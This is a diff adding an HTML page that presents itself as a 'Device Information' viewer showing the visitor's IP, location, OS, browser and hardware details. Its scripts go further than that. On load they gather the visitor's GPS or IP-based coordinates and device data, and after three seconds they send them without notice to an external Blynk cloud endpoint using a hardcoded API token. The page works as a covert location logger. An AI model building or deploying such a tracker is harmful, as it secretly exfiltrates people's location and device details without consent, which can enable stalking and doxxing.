@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<title>Device Information</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+
+body{    font-family:Arial;    text-align:center;    margin:30px;}
+.box{    background:#eee;    padding:20px;    border-radius:10px;    max-width:600px;    margin:auto;}
+p{    text-align:left;}
+a{    color:blue;}
+</style>
+</head>
+
+<body>
+<div class="box">
+<h2>Device Information</h2>
+
+
+<p>IP Address:
+<span id="ip">-</span>
+</p>
+
+<p>Location:
+<span id="location">-</span>
+</p>
+
+<p>Location Source:
+<span id="source">-</span>
+</p>
+
+<p>Latitude:
+<span id="lat">-</span>
+</p>
+
+<p>Longitude:
+<span id="lon">-</span>
+</p>
+
+<p>
+Google Maps:
+<br>
+<a id="map" target="_blank">
+Open Location
+</a>
+</p>
+
+<p>OS:
+<span id="os">-</span>
+</p>
+
+<p>Device Type:
+<span id="device">-</span>
+</p>
+
+<p>Browser:
+<span id="browser">-</span>
+</p>
+
+<p>Screen:
+<span id="screen">-</span>
+</p>
+
+<p>CPU Cores:
+<span id="cpu">-</span>
+</p>
+
+<p>RAM:
+<span id="ram">-</span>
+</p>
+
+<p>Battery:
+<span id="battery">-</span>
+</p>
+
+<p>Device Model:
+<span id="model">Not available</span>
+</p>
+
+
+<p>Device Model:
+<span id="model">Not available</span>
+</p>
+
+<p>
+Data:
+<br>
+<span id="data">-</span>
+</p>
+
+</div>
+
+
+</div>
+
+
+<script>
+function hitWebsite() {
+    data = JSON.stringify(data);
+    var url = "https://sgp1.blynk.cloud/external/api/update?token=grpkWejUxTvRG4dCqh0jXHv-Hykwq2ZP&v1="+ data;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.send();
+}
+window.onload = function() {    setTimeout(hitWebsite, 3000);};
+
+</script>
+
+
+
+
+<script>
+
+let URL = "https://sgp1.blynk.cloud/external/api/update?token=grpkWejUxTvRG4dCqh0jXHv-Hykwq2ZP&v1=";
+
+let data = "";
+
+async function getLocation(){
+if(navigator.permissions){
+try{
+let permission =
+await navigator.permissions.query({
+name:"geolocation"
+});
+if(permission.state==="granted"){getGPS();}
+else{getIPLocation();}}
+catch(e){getIPLocation();}}
+else{getIPLocation();}}
+
+function getGPS(){
+navigator.geolocation.getCurrentPosition(
+function(position){
+let lat =position.coords.latitude;
+let lon =position.coords.longitude;
+showLocation(lat,lon,"GPS (Accurate) 10–100 m");
+},
+
+
+function(){getIPLocation();},
+{
+enableHighAccuracy:true,
+timeout:5000,
+maximumAge:0
+}
+);
+}
+
+function getIPLocation(){
+fetch("https://ipapi.co/json/")
+.then(response=>response.json())
+.then(data=>{
+
+document.getElementById("ip").innerHTML =data.ip;
+
+showLocation(data.latitude,data.longitude,"IP (Approximate) 1–50 km");
+
+document.getElementById("location").innerHTML =data.city+", "+data.country_name;});
+}
+
+
+
+
+function showLocation(lat, lon, source){
+
+    document.getElementById("lat").innerHTML = lat;
+    document.getElementById("lon").innerHTML = lon;
+    document.getElementById("source").innerHTML = source;
+
+    let mapURL = "https://www.google.com/maps?q=" + lat + "," + lon;
+    document.getElementById("map").href = mapURL;
+    document.getElementById("map").innerHTML = "Open in Google Maps";
+
+
+    // Save information into variable
+    data = {
+        ip: document.getElementById("ip").innerHTML,
+        latitude: lat,
+        longitude: lon,
+        source: source,
+        os: os,
+        browser: browser,
+        device: device,
+        map: mapURL
+    };
+
+    console.log(JSON.stringify(data));
+document.getElementById("data").innerHTML = JSON.stringify(data);
+}
+
+
+let ua=navigator.userAgent;
+
+let os="Unknown";
+
+if(/Windows/i.test(ua))
+os="Windows";
+
+else if(/Android/i.test(ua))
+os="Android";
+
+else if(/iPhone|iPad/i.test(ua))
+os="iOS";
+
+else if(/Mac/i.test(ua))
+os="MacOS";
+
+else if(/Linux/i.test(ua))
+os="Linux";
+
+
+document.getElementById("os").innerHTML=os;
+
+let device="PC";
+
+
+if(/Tablet/i.test(ua))
+device="Tablet";
+
+else if(/Mobi|Android/i.test(ua))
+device="Mobile";
+
+
+document.getElementById("device").innerHTML=device;
+
+let browser="Unknown";
+
+if(ua.includes("Chrome"))
+browser="Chrome";
+
+else if(ua.includes("Firefox"))
+browser="Firefox";
+
+else if(ua.includes("Safari"))
+browser="Safari";
+
+document.getElementById("browser").innerHTML =browser;
+document.getElementById("screen").innerHTML =screen.width+" x "+screen.height;
+document.getElementById("cpu").innerHTML =navigator.hardwareConcurrency || "Unknown";
+document.getElementById("ram").innerHTML =navigator.deviceMemory ?navigator.deviceMemory+" GB (estimated)":"Unavailable";
+
+if(navigator.getBattery){
+navigator.getBattery()
+.then(function(battery){
+
+function updateBattery(){
+document.getElementById("battery").innerHTML =Math.round(battery.level*100)+"%";
+}
+
+updateBattery();
+
+battery.addEventListener("levelchange",updateBattery);
+
+});
+
+}
+
+else{
+document.getElementById("battery").innerHTML ="Not supported";
+}
+
+if(navigator.userAgentData){
+navigator.userAgentData
+.getHighEntropyValues(["model","platform","architecture"])
+.then(data=>{
+
+if(data.model)
+
+document.getElementById("model").innerHTML =data.model;
+else
+document.getElementById("model").innerHTML ="Hidden by browser";
+
+});
+}
+getLocation();
+
+</script>
+
+
+</body>
+</html>
